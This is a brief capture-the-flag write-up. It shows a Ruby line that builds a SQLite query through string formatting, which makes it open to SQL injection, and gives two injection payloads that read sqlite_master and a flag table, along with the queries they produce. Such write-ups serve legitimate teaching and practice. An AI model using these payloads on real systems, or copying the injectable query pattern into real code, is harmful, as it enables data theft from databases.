# writeup
```rb
	@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
```

Payloads:
```
* from sqlite_master union select 0,0,0,0,0
```
=>
```
select * from sqlite_master union select 0,0,0,0,0 from quills limit 100 offset 0
```

```
* from flagtable union select 0
```
=>
```
select * from flagtable union select 0 from quills limit 100 offset 0
```